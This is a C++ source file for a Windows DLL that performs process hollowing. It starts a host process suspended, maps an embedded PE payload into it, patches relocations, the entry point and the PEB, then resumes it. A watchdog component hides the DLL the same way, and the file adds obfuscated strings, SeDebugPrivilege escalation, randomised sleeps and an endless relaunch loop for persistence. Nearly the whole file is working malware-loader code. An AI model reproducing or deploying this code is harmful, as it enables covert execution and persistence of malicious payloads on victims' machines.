// ProcessHollowing.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include "ph.h"
#include <time.h>
#include <sstream>
#include "..\log.h"
#include "..\utilities.h"
#include "..\persist.h"
#include <ShlObj.h>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "User32.lib")

#ifdef _DBG
#pragma comment(lib, "Shell32.lib")		
#endif

//FILE * debug_file_handle = stdout;

//Flag to determine if we are the target or watcher
bool watch_target = false;

extern "C" __declspec (dllexport) void __cdecl RegisterDll (
   HWND hwnd,        // handle to owner window
   HINSTANCE hinst,  // instance handle for the DLL
   LPTSTR lpCmdLine, // string the DLL will parse
   int nCmdShow      // show state
){
  //::MessageBox(0,lpCmdLine,0,0);
}


/*
 * Current DLL hmodule.
 */
static HMODULE dll_handle = NULL;

PEB_PARTIAL ReadRemotePEB(HANDLE hProcess, LPVOID dwPEBAddress )
{
	PEB_PARTIAL pPEB;
	memset(&pPEB, 0, sizeof(PEB_PARTIAL));
	
	BOOL bSuccess = ReadProcessMemory
		(
		hProcess,
		(LPCVOID)((size_t)dwPEBAddress),
		&pPEB,
		sizeof(pPEB),
		0
		);
	
	return pPEB;
}

int enableSEPrivilege(LPCTSTR name) 
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkp;

	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) return 0;

    if(!LookupPrivilegeValue(NULL, name, &luid)) return 0;

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if(!AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL)) return 0;

	if(GetLastError() == ERROR_NOT_ALL_ASSIGNED) return 0;

	CloseHandle(hToken);
	return 1;
}


bool GetResourceImageBuffer(DWORD resID, char **ImgResData, DWORD *sourceImgSize) {
	HGLOBAL hResourceLoaded;  // handle to loaded resource
    HRSRC   hRes;              // handle/ptr to res. info.

	//Get the resource
	hRes = FindResource(dll_handle, MAKEINTRESOURCE(resID) ,"JLR");
	if( hRes == nullptr ) { 
#ifdef _DBG
		Log("Unable to find resource.\r\n");
#endif
		return false;
	}

    hResourceLoaded = LoadResource(dll_handle, hRes);
	if( hResourceLoaded == nullptr ) {
#ifdef _DBG
		Log("Unable to load resource.\r\n");
#endif
		return false;
	}

    *ImgResData = (char *)LockResource(hResourceLoaded);
	if( hResourceLoaded == nullptr ) {
#ifdef _DBG
			Log("Unable to lock resource.\r\n");
#endif
		return false;
	}

    *sourceImgSize = SizeofResource(dll_handle, hRes);
#ifdef _DBG
	Log("file size %d\n", *sourceImgSize);
#endif

	return true;
}


DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_entry )
{
	NTSTATUS stat;
	
#ifdef _DBG
		Log("Creating process\r\n");
   #endif

	//Start the target process suspended
	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
	if (!CreateProcess((LPSTR)pDestCmdLine, NULL, NULL, NULL, NULL,
					CREATE_SUSPENDED|DETACHED_PROCESS|CREATE_NO_WINDOW,
					NULL, NULL, pStartupInfo, pProcessInfo))
	{
#ifdef _DBG
		Log( "[-] CreateProcessW failed. Error = %x\n", GetLastError());
#endif
		return 0;
	}

	//Resolve necessary functions
	ZwQueryInformationProcess = (long (__stdcall *)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(GetModuleHandleA("ntdll"),"ZwQueryInformationProcess");
	ZwMapViewOfSection = (long (__stdcall *)(HANDLE,HANDLE,PVOID *,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG))GetProcAddress(GetModuleHandleA("ntdll"),"ZwMapViewOfSection");
	ZwUnmapViewOfSection = (long (__stdcall *)(HANDLE, PVOID))GetProcAddress(GetModuleHandleA("ntdll"),"ZwUnmapViewOfSection");
	ZwCreateSection = (long (__stdcall *)(PHANDLE,ACCESS_MASK,PDWORD,PLARGE_INTEGER,ULONG,ULONG,HANDLE))GetProcAddress(GetModuleHandleA("ntdll"),"ZwCreateSection");

	if (ZwMapViewOfSection == NULL || ZwQueryInformationProcess == NULL || ZwUnmapViewOfSection == NULL || ZwCreateSection == NULL)
	{
#ifdef _DBG
		Log( "[-] GetProcAddress failed\n");
#endif
		return 0;
	}

	//Get process information
	PROCESS_BASIC_INFORMATION pbi;
	if (ZwQueryInformationProcess(pProcessInfo->hProcess, 0, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL) != 0)
    {

#ifdef _DBG
		Log("[-] ZwQueryInformation failed\n");
#endif
		return 0;
    }


#ifdef _DBG
	Log( "[+] UniqueProcessID = 0x%x\n", pbi.UniqueProcessId);
#endif
	PEB_PARTIAL peb_struct = (PEB_PARTIAL)ReadRemotePEB(pProcessInfo->hProcess , pbi.PebBaseAddress );
	PVOID ImageBase = peb_struct.ImageBaseAddress;

#ifdef _DBG
	Log( "[+] ImageBase = 0x%x\n", ImageBase);
#endif

	PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, (LPCVOID)ImageBase);
	SIZE_T image_size = pImage->FileHeader->OptionalHeader.SizeOfImage;
	SIZE_T rem_entry_pt = pImage->FileHeader->OptionalHeader.AddressOfEntryPoint;	

	SIZE_T nb_read;
	char *read_proc = (char *)malloc(image_size);
	if (!ReadProcessMemory(pProcessInfo->hProcess, (LPCVOID)ImageBase, read_proc, image_size, &nb_read) )
	{

#ifdef _DBG
		Log( "[-] ReadProcessMemory failed\n");
#endif
		return 0;
	}


//****************************************************************************************************************


	//Load replacement image
	PLOADED_IMAGE pSourceImage = GetLoadedImage((BYTE *)ImgData);

	LARGE_INTEGER a;
	a.QuadPart = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;
	HANDLE image_sect;
	if ((stat = ZwCreateSection(&image_sect, SECTION_ALL_ACCESS, NULL, &a, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		Log("[-] ZwCreateSection failed. NTSTATUS = %x\n", stat);
#endif
		return 0;
	}

	SIZE_T size;
	size = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;

	PVOID BaseAddress = (PVOID)0;
	if ((stat = ZwMapViewOfSection(image_sect, pProcessInfo->hProcess, &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		Log( "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
#endif
		return 0;
	}	

	//Unmap the test location
	ZwUnmapViewOfSection(pProcessInfo->hProcess, BaseAddress);
	PVOID RemoteAddress = BaseAddress;

	//Set size
	size = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;
	BaseAddress = (PVOID)0;
	if ((stat = ZwMapViewOfSection(image_sect, GetCurrentProcess(), &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		Log( "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
#endif
		return 0;
	}	
		
	#ifdef _M_IX86
		PIMAGE_NT_HEADERS32 ptr = (PIMAGE_NT_HEADERS32)(pSourceImage->FileHeader);
	#endif 

	#ifdef _M_X64
		PIMAGE_NT_HEADERS64 ptr = (PIMAGE_NT_HEADERS64)(pSourceImage->FileHeader);
	#endif 

	//Get the address of the entry point
	PVOID addr = (PVOID)&ptr->OptionalHeader.ImageBase;
	PVOID beg = (PVOID)ptr;
	size_t diff = (size_t)addr - (size_t)beg;
	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)ImgData;
	size_t image_base = pDOSHeader->e_lfanew + diff;
		
	//copy the headers to the dest buffer
	memcpy(	BaseAddress, ImgData, pSourceImage->FileHeader->OptionalHeader.SizeOfHeaders );
	
	//Image entry
#ifdef _DBG
	Log( "Loaded image entry point: 0x%x\n", pSourceImage->FileHeader->OptionalHeader.AddressOfEntryPoint);
#endif 

	//Base before
	size_t before = 0;
	memcpy(&before, (PVOID)((size_t)BaseAddress + image_base), sizeof(before)); 
	
#ifdef _DBG
	Log("Base before: %p\n", before);
#endif 


	//Copy updated image base address
	memcpy((PVOID)((size_t)BaseAddress + image_base), &RemoteAddress, sizeof(RemoteAddress)); 

	//Copy each section of the replacement binary
	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination = (PVOID)((size_t)BaseAddress + pSourceImage->Sections[x].VirtualAddress);

		#ifdef _DBG
			Log("Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);
		#endif

		memcpy( pSectionDestination, &ImgData[pSourceImage->Sections[x].PointerToRawData],
			pSourceImage->Sections[x].SizeOfRawData);
	}	


#ifdef _DBG
	Log(
			"Source image base: 0x%p\r\n"
			"Destination image base: 0x%p\r\n",
			pSourceImage->FileHeader->OptionalHeader.ImageBase,
			RemoteAddress
	);
#endif

	//Get the difference between the new destination memory address and the image base
	size_t dwDelta = 0;
	boolean subtract = false;
	if ( (size_t)RemoteAddress >= (size_t)pSourceImage->FileHeader->OptionalHeader.ImageBase )
		dwDelta =  (size_t)RemoteAddress - (size_t)pSourceImage->FileHeader->OptionalHeader.ImageBase;	
	else {
		dwDelta = (size_t)pSourceImage->FileHeader->OptionalHeader.ImageBase - (size_t)RemoteAddress;
		subtract = true;
	}
	

	#ifdef _DBG
		Log("Relocation delta: 0x%p\r\n", dwDelta);
		Log("Writing headers\r\n");
	#endif

    // Rebase image if necessary, x86 and x64
	if (dwDelta){

		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
			char* pSectionName = ".reloc";		

			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;

			#ifdef _DBG
				Log("Rebasing image\r\n");
			#endif

			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;

			IMAGE_DATA_DIRECTORY relocData = 
				pSourceImage->FileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			while (dwOffset < relocData.Size)
			{
				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&ImgData[dwRelocAddr + dwOffset];

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);

				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&ImgData[dwRelocAddr + dwOffset];

				for (DWORD y = 0; y <  dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[y].Type == 0)
						continue;

					DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;
					size_t dwBuffer = 0;

					//Copy the address from memory
					memcpy(&dwBuffer, (PVOID)((size_t)BaseAddress + dwFieldAddress), sizeof(dwBuffer));

					//Update it
					if( subtract )
						dwBuffer -= dwDelta;
					else
						dwBuffer += dwDelta;

					//Copy back the fixed up address
					memcpy((PVOID)((size_t)BaseAddress + dwFieldAddress), &dwBuffer, sizeof(dwBuffer));
	
				}
			}

			break;
		}

	}

	////Load any dll import needed by the program
	//LoadDllImports( BaseAddress );

	//Map the orginial over our data
	size = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;
	if ((stat = ZwMapViewOfSection(image_sect, pProcessInfo->hProcess, &RemoteAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		Log( "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
#endif
		return 0;
	}


//*************************************************************************************************

	size = image_size;
	a.QuadPart = size;
	HANDLE entry_sect;
	if ((stat = ZwCreateSection(&entry_sect, SECTION_ALL_ACCESS, NULL, &a, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		Log("[-] ZwCreateSection failed. NTSTATUS = %x\n", stat);
#endif
		return 0;
	}

	//Set size
	BaseAddress = (PVOID)0;
	if ((stat = ZwMapViewOfSection(entry_sect, GetCurrentProcess(), &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		Log("[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
#endif
		return 0;
	}	
	
	//Entrypoint addr
	size_t entr_addr = (size_t)RemoteAddress + pSourceImage->FileHeader->OptionalHeader.AddressOfEntryPoint;
	DWORD counter = 0;	
	unsigned int sc_size = 0x50;
	unsigned char jmpshellcode[0x50];
	memset(jmpshellcode, 0, sc_size);

	//Add breakpoint
#ifdef _DBG
//	*(unsigned char *)&jmpshellcode[counter++] = 0xcc;	   // breakpoint
#endif


	//Add reason and dll entry load addr
	if( dll_entry ){

#ifdef _M_X64

		//Add Reserved to R8
		*(unsigned char *)&jmpshellcode[counter++] = 0x49;
		*(unsigned char *)&jmpshellcode[counter++] = 0xb8;	   // MOV R8, IMM64 (entry addr)
		*(size_t *) &jmpshellcode[counter] = 0x12;
		counter = counter + sizeof(size_t);

		//Add DLL reason to RDX
		*(unsigned char *)&jmpshellcode[counter++] = 0x48;
		*(unsigned char *)&jmpshellcode[counter++] = 0xba;	   // MOV RDX, IMM64 (entry addr)
		*(size_t *) &jmpshellcode[counter] = 0x1;
		counter = counter + sizeof(size_t);

		//Base Addr to RCX
		*(unsigned char *)&jmpshellcode[counter++] = 0x48;
		*(unsigned char *)&jmpshellcode[counter++] = 0xb9;	   // MOV RCX, IMM64 (entry addr)
		*(size_t *) &jmpshellcode[counter] = (size_t)RemoteAddress;
		counter = counter + sizeof(size_t);

#else
		//POP RETURN PTR 
		*(unsigned char *)&jmpshellcode[counter++] = 0x59;     // POP ECX

		//Add Reserved
		*(unsigned char *)&jmpshellcode[counter++] = 0xb8;	   // MOV EAX, IMM64 (entry addr)
		*(size_t *) &jmpshellcode[counter] = 0x12;
		counter = counter + sizeof(size_t);

		//PUSH 
		*(unsigned char *)&jmpshellcode[counter++] = 0x50;     // PUSH EAX

		//Add dll attach type parameter
		*(unsigned char *)&jmpshellcode[counter++] = 0xb8;	   // MOV EAX, IMM64 (entry addr)
		*(DWORD *) &jmpshellcode[counter] = 0x1;
		counter = counter + sizeof(DWORD);

		//PUSH 
		*(unsigned char *)&jmpshellcode[counter++] = 0x50;     // PUSH EAX

		//Add process base address
		*(unsigned char *)&jmpshellcode[counter++] = 0xb8;	   // MOV EAX, IMM64 (entry addr)
		*(size_t *) &jmpshellcode[counter] = (size_t)RemoteAddress;
		counter = counter + sizeof(size_t);

		//PUSH 
		*(unsigned char *)&jmpshellcode[counter++] = 0x50;     // PUSH EAX

		//PUSH RETURN PTR 
		*(unsigned char *)&jmpshellcode[counter++] = 0x51;     // PUSH ECX

#endif

	}

	
#ifdef _M_X64
	*(unsigned char *)&jmpshellcode[counter++] = 0x48;
#endif

	*(unsigned char *)&jmpshellcode[counter++] = 0xb8;	   // MOV EAX, IMM64 (entry addr)
	*(size_t *) &jmpshellcode[counter] = entr_addr;
	counter = counter + sizeof(size_t);

	//PUSH address of entry point
	*(unsigned char *)&jmpshellcode[counter++] = 0x50;     // PUSH EAX
	*(unsigned char *)&jmpshellcode[counter++] = 0xc3;     // RET

	//copy the binary to the mapped buffer
	memcpy((BYTE*)read_proc + rem_entry_pt, jmpshellcode, sizeof(jmpshellcode));
	memcpy(BaseAddress, read_proc, image_size);
	BaseAddress = (PVOID)ImageBase;

	//Unmap the orginal image
	ZwUnmapViewOfSection(pProcessInfo->hProcess, BaseAddress);

	//Map the orginial over our data
	if ((stat = ZwMapViewOfSection(entry_sect, pProcessInfo->hProcess, &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		Log("[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
#endif
		return 0;
	}

	//*********************
	//Write the new ImageBase to the PEB or it will not work
	//*********************
	WriteProcessMemory (
		pProcessInfo->hProcess,
		(LPVOID)((size_t) pbi.PebBaseAddress + (sizeof(size_t) * 2)),
		&RemoteAddress,
		sizeof(RemoteAddress),
		0
	);

	//Resume execution
	ResumeThread(pProcessInfo->hThread);
	//system("pause");

	return pProcessInfo->dwProcessId;

}

int main(int argc, char* argv[]){
	
	//Check the global else load the watchdog
	if( watch_target ){

#ifdef _DBG	
	CHAR path[MAX_PATH];
	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, path))) {
		std::string str_path(path);
		str_path.append("\\payld.log");
		SetLogPath(str_path.c_str());
	}
#endif
		LoadPayload();
		exit(1);

	} else {	

#ifdef _DBG	
	CHAR path[MAX_PATH];
	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, path))) {
		std::string str_path(path);
		str_path.append("\\wdg.log");
		SetLogPath(str_path.c_str());
	}
#endif
		LoadWatchDog();
	}
	
}

//====================================================================
/*
*
*	Function for loading the watchdog process
*
*/
void LoadWatchDog() {

	HANDLE hFile;
	char module_name[MAX_PATH];
	int dwLength = 0;
	char *imgBuffer = NULL;
	DWORD imgBufferSize = 0, bytesRead = 0;


	//Get watch dog host path
    char watchdog_host[400];
	LoadString(dll_handle, IDS_WATCHDOG_HOST, watchdog_host, 400);
	if( strlen( watchdog_host ) == 0 ){
#ifdef _DBG
		Log( "[-] Error: Watchdog host path not set. Exiting\n");
#endif
		return;
	}

	//Deobfuscate it
	char *watchdog_host_ptr = decode_split(watchdog_host, 400);
	std::string hollow_proc_str(watchdog_host_ptr);
	free(watchdog_host_ptr);

		
	memset(module_name, 0, MAX_PATH );
	
	//Get the dll module name
	dwLength = GetModuleFileName(dll_handle, module_name, MAX_PATH);

	//open file and read its contents
	hFile = CreateFile(module_name, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile != INVALID_HANDLE_VALUE) {
		imgBufferSize = GetFileSize(hFile, NULL);
		if(imgBufferSize != INVALID_FILE_SIZE) {
			imgBuffer = (char *)malloc(imgBufferSize+1);
			if(imgBuffer)
				ReadFile(hFile, imgBuffer, imgBufferSize, &bytesRead, NULL);

		}
		CloseHandle(hFile);
	} 

	//TMP
	char *tmp_ptr = decode_split("\x5\x4\x4\xd\x5\x0",6);
		
	//Create an env variable with the name of the dll
	if (! SetEnvironmentVariable(tmp_ptr, module_name )) {
#ifdef _DBG
		Log("SetEnvironmentVariable failed (%d)\n", GetLastError());
#endif
		//Free memory
		free(tmp_ptr);
        return;
    }

	//create new hollowed process and fill with loader
	if((imgBufferSize > 0) && imgBufferSize == bytesRead) {
		
		//If the process string is not empty
		if(hollow_proc_str.length() > 0)
			CreateHollowedProcess(hollow_proc_str.c_str(), imgBuffer, true );

	}
	
	//Free memory
	if(imgBuffer)
		free(imgBuffer);		
	if(tmp_ptr)
		free(tmp_ptr);
}

void LoadPayload(){
	
	
	PERSIST_STRUCT * persist_struct_ptr = (PERSIST_STRUCT *)calloc(1, sizeof(PERSIST_STRUCT));
	if( persist_struct_ptr == nullptr ){
#ifdef _DBG
		Log( "[-] Unable to allocate memory. Quitting\n" );
#endif
		return;
	}
	
	//Range from 5 to 10 seconds
	unsigned int rand_num =  ( rand() % (1000 * 5) ) + (1000 * 5);
	Sleep(rand_num);
	
	int adminPrivs = enableSEPrivilege(SE_DEBUG_NAME);

    //String holding the dll path and pid
	std::string dll_path_pid;
	size_t len;

	//TEMP
	char *temp_ptr = decode_split("\x5\x4\x4\x5\x4\xd\x5\x0",8);
	//Get TEMP env
	char * temp_env = nullptr;
	_dupenv_s (&temp_env, &len, temp_ptr);
	free(temp_ptr);

	//TMP
	char *tmp_ptr = decode_split("\x5\x4\x4\xd\x5\x0",6);

	//Get TMP env - this is the one we set in proc hollow
	char * tmp_env = nullptr;
	_dupenv_s (&tmp_env, &len, tmp_ptr);
	if( tmp_env && strlen(tmp_env) > 0 ){
		
		//Assign DLL
		persist_struct_ptr->dll_file_path.assign( tmp_env );

		//Create string stream
		std::stringstream ss;
		ss << tmp_env << "|" << GetCurrentProcessId();
		dll_path_pid.assign(ss.str());

		//Free memory
		free(tmp_env);

		//Create an env variable with the name of the dll
		if (! SetEnvironmentVariable(tmp_ptr, dll_path_pid.c_str() )) {
#ifdef _DBG
			Log("SetEnvironmentVariable failed (%d)\n", GetLastError());
#endif
			return;
		}
	}

	//Get payload host path
    char payload_host[400];
	LoadString(dll_handle, IDS_PAYLOAD_HOST, payload_host, 400);
	if( strlen( payload_host ) == 0 ){
#ifdef _DBG
		Log( "[-] Error: Payload host path not set. Exiting\n");
#endif
		return;
	}

	//Deobfuscate it
	char *payload_host_ptr = decode_split(payload_host, 400);
	std::string hollow_proc_str(payload_host_ptr);
	free(payload_host_ptr);

	char *imgResData = NULL;
	DWORD imgDataSize = 0;

	//Get the resource buffer
	if( !GetResourceImageBuffer(IDR_BIN1, &imgResData, &imgDataSize) ){
#ifdef _DBG
		Log( "[-] Error: Unable to get resource.\n");
#endif
		return;
	}


	//Load DLL into memory
	if( !ReadDllIntoMemory( persist_struct_ptr ) ){
#ifdef _DBG
		Log("[-] Error: Unable to read DLL into memory. Exiting\n");
#endif
		return;
	}

	//Initialize rand
	srand ( (unsigned int )time(NULL));

	//Create new process repeatedly
	while( 1 ){

		DWORD proc_pid = CreateHollowedProcess( hollow_proc_str.c_str(), imgResData, false );
		HANDLE proc_handle = OpenProcess( SYNCHRONIZE, TRUE, proc_pid);

		//Reset
		if( temp_env && (strcmp(tmp_env, temp_env) != 0)  ){		
			//Set TMP back to TEMP
			SetEnvironmentVariable(tmp_ptr, temp_env);
			
		} else {
			//Reset TMP var
			SetEnvironmentVariable(tmp_ptr, "");
		}

		WaitForSingleObject(proc_handle, INFINITE );
			
		//Range from 1 mins to 2
		unsigned int rand_num =  ( rand() % (1000 * 60 * 1) ) + (1000 * 60 * 1);
		Sleep(rand_num);
		
		//Write the DLL to disk before attempting to load
		WriteDllToDisk(persist_struct_ptr);

#ifdef _DBG
		Log("Restarting monitored process.");
#endif
		//Set it back
		if (! SetEnvironmentVariable(tmp_ptr, dll_path_pid.c_str() )) {
	#ifdef _DBG
			Log("SetEnvironmentVariable failed (%d)\n", GetLastError());
	#endif
			return;
		}

	}

	
	//Free memory
	free(tmp_ptr);
	

}

//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	DWORD dwResult = 0;
	unsigned int ret =0;

	switch( dwReason ) 
    { 
		case DLL_PROCESS_ATTACH:
			dll_handle = (HMODULE)hinstDLL;

			//If the reserved flag is set, we are the injected process
			if( lpReserved )
				watch_target = true;

			main(0, nullptr);

		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}

